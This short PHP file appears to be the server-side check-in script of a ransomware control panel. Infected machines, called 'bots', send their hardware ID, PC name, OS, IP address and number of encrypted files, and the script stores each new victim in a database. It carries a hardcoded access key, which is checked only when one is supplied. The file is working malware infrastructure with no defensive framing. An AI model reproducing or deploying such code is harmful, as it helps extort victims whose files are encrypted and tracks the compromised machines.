<?PHP
include('config.php');

$key = "127AudghjAQWrtgLVGQWref%^32qqdfs";


if(isset($_GET['key']))
{
	if($key !== $_GET['key']) die("Incorrect Key");
}

if(isset($_GET['hwid']) && isset($_GET['pc']) && isset($_GET['os']) && isset($_GET['ip']) && isset($_GET['encfiles']))
{
	$hwid = mysql_real_escape_string($_GET['hwid']);
	$usr = mysql_real_escape_string($_GET['pc']);
	$ip = mysql_real_escape_string($_GET['ip']);
	$os = mysql_real_escape_string($_GET['os']);
	$encrypted = (int)$_GET['encfiles'];
	
	
	$id_sql = "SELECT COUNT(*) FROM bots WHERE HWID='$hwid'";
	$hwid_res = mysql_query($id_sql);
	if(mysql_fetch_row($hwid_res)[0] == 0)
	{
		$ins_sql = "INSERT INTO bots VALUES (NULL, '$hwid', '$usr', '$ip', '$encrypted', 3265, '$os')";
		$result = mysql_query($ins_sql);
	}
	else die();
}

?>